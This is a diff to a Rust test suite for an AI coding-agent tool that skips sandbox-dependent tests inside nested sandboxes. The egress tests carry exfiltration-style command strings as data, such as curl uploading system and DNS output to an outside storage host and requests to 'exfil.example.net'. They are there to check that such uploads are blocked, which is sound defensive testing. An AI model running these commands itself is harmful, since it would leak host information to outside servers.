@@ -2386,6 +2386,9 @@ async fn until_idle(h: &mut Handle) -> Vec<Envelope> {
 /// and the session file now belongs to that folder.
 #[tokio::test]
 async fn use_folder_moves_a_chat_into_a_project() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let base = std::env::temp_dir().join(format!("frog-use-folder-{}", new_id()));
     let (chat, project, store) = (base.join("chat"), base.join("project"), base.join("store"));
     for d in [&chat, &project, &store] {
@@ -2507,6 +2510,9 @@ fn chat_engine(script: Vec<Response>, cwd: PathBuf) -> Handle {
 /// dead session's log still says where it was working; a command that stays put isn't.
 #[tokio::test]
 async fn a_bash_cd_logs_the_shell_cwd() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let base = std::env::temp_dir().join(format!("frog-shell-cwd-{}", new_id()));
     let (root, store) = (base.join("repo"), base.join("store"));
     let tree = root.join(".frog/worktrees/w");
@@ -2906,6 +2912,9 @@ async fn shutdown(mut h: Handle) {
 /// that call's own result. The next command runs from the root without a notice.
 #[tokio::test]
 async fn removing_its_own_cwd_falls_back_quietly() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let base = std::env::temp_dir().join(format!("frog-cwd-self-{}", session::new_id()));
     let project = base.join("project");
     std::fs::create_dir_all(project.join("wt")).unwrap();
@@ -2972,6 +2981,9 @@ async fn removing_its_own_cwd_falls_back_quietly() {
 /// request (its relative paths now resolve somewhere else).
 #[tokio::test]
 async fn bash_falls_back_to_the_session_root_when_cwd_is_deleted() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let base = std::env::temp_dir().join(format!("frog-cwd-gone-{}", session::new_id()));
     let project = base.join("project");
     let gone = project.join("gone");
@@ -6927,6 +6939,9 @@ mod egress_tests {
     #[cfg(target_os = "macos")]
     #[tokio::test]
     async fn a_workers_upload_to_an_unlisted_host_is_blocked_at_connect() {
+        if crate::tools::bash::nested_sandbox() {
+            return;
+        }
         let probe = "uname -a > probe.txt && scutil --dns | head -3 >> probe.txt; curl -sS -m 5 -T probe.txt https://oss-cn-beijing.aliyuncs.com/probe/probe.txt; echo rc=$?";
         let py = "python3 -c \"import urllib.request; urllib.request.urlopen('https://exfil.example.net/x?d=1', timeout=5)\" 2>&1 | tail -1; echo rc=$?";
         let (mut h, dir) = egress_engine(
@@ -6975,6 +6990,9 @@ mod egress_tests {
     #[cfg(target_os = "macos")]
     #[tokio::test]
     async fn workers_enforce_and_interactive_sessions_keep_the_open_network() {
+        if crate::tools::bash::nested_sandbox() {
+            return;
+        }
         for worker in [true, false] {
             let (mut h, dir) = egress_engine(
                 vec![
@@ -7003,6 +7021,9 @@ mod egress_tests {
     #[cfg(target_os = "macos")]
     #[tokio::test]
     async fn an_explicit_grant_unblocks_one_call_or_adds_the_host() {
+        if crate::tools::bash::nested_sandbox() {
+            return;
+        }
         let curl = "curl -sS -m 3 -o /dev/null https://pkgs.example.org/x; echo rc=$?";
         let (mut h, dir) = egress_engine(
             vec![
@@ -7199,6 +7220,9 @@ mod egress_tests {
     #[cfg(target_os = "macos")]
     #[tokio::test]
     async fn yolo_still_blocks_an_undeclared_host() {
+        if crate::tools::bash::nested_sandbox() {
+            return;
+        }
         let exfil = "curl -sS -m 5 -o /dev/null https://exfil.example.net/x; echo rc=$?";
         let (mut h, dir) = egress_engine(
             vec![
@@ -7701,6 +7725,9 @@ fn repo_with_worktree(tag: &str) -> (PathBuf, PathBuf) {
 /// worktree even after the shell moved to the main checkout.
 #[tokio::test]
 async fn file_tools_stay_rooted_in_the_session_worktree() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let (main, wt) = repo_with_worktree("root");
     let pwd = Block::ToolUse {
         id: "p".into(),
@@ -7967,6 +7994,9 @@ async fn rewind_restores_files_and_branches_the_conversation() {
 
 #[tokio::test]
 async fn rewind_in_a_git_repo_undoes_shell_commands_too() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     let ws = tmp_store();
     let git = |args: &[&str]| {
@@ -9621,6 +9651,9 @@ async fn draining_the_parent_suspends_its_subagent_mid_turn_and_resume_reruns() 
 /// doesn't inline that file into the turn.
 #[tokio::test]
 async fn a_wake_notice_does_not_expand_mentions() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     std::fs::write(dir.join("notes.txt"), "inlined-file-body").unwrap();
     let job = call(
@@ -9649,6 +9682,9 @@ async fn a_wake_notice_does_not_expand_mentions() {
 
 #[tokio::test]
 async fn a_finished_bash_job_reports_its_exit_and_output() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     let job = call(
         "b",
@@ -9692,6 +9728,9 @@ async fn a_finished_bash_job_reports_its_exit_and_output() {
 /// ended, so a model working through a long turn reasoned about a stale world.
 #[tokio::test]
 async fn a_wake_landing_mid_turn_reaches_the_next_call_of_that_turn() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     // A monitor that fires 1s in, while the 3s Bash call is still running: the notice is
     // parked before the turn's second step starts, and drops here.
@@ -9945,6 +9984,9 @@ async fn a_second_long_sleep_while_one_waits_is_refused() {
 /// through to the turn's end and ran as the next turn; that is the behaviour this replaces.)
 #[tokio::test]
 async fn wakes_mid_turn_join_that_turn_in_order() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     let script = vec![
         reply(
@@ -10080,6 +10122,9 @@ async fn an_informational_message_is_read_without_a_turn() {
 /// wake row, because the wake already landed.
 #[tokio::test]
 async fn a_wake_joins_the_turn_and_a_late_message_opens_the_next() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     let script = vec![
         reply(
@@ -10167,6 +10212,9 @@ async fn a_wake_joins_the_turn_and_a_late_message_opens_the_next() {
 /// start a turn of its own; it goes along with the user's next message.
 #[tokio::test]
 async fn a_stop_holds_wakes_for_the_next_turn() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     let script = vec![
         reply(
@@ -10234,6 +10282,9 @@ async fn a_stop_holds_wakes_for_the_next_turn() {
 /// Short sleeps and sleeps with real work after them still run inline, as written.
 #[tokio::test]
 async fn a_short_sleep_or_real_work_runs_inline() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let dir = tmp_store();
     let script = vec![
         reply(
@@ -12355,6 +12406,9 @@ async fn second_pass_allows_deleting_the_sessions_own_scratch() {
 /// user even when the second pass (and a chief grant) would have allowed it.
 #[tokio::test]
 async fn rm_rf_outside_scratch_is_never_delegated() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     // Outside the shared temp dir: on Linux the test engine's project root *is*
     // /tmp, so a tree there would count as in-project.
     let dir = crate::approval::normalize(
@@ -13418,6 +13472,9 @@ async fn with_every_node_down_the_turn_ends_with_one_line() {
 /// every change is a durable `Prs` with the whole list (so a replay renders the git line).
 #[tokio::test]
 async fn prs_bind_from_gh_pr_create_and_by_hand() {
+    if crate::tools::bash::nested_sandbox() {
+        return;
+    }
     let base = std::env::temp_dir().join(format!("frog-prs-{}", new_id()));
     let (root, store) = (base.join("repo"), base.join("store"));
     for d in [&root, &store] {
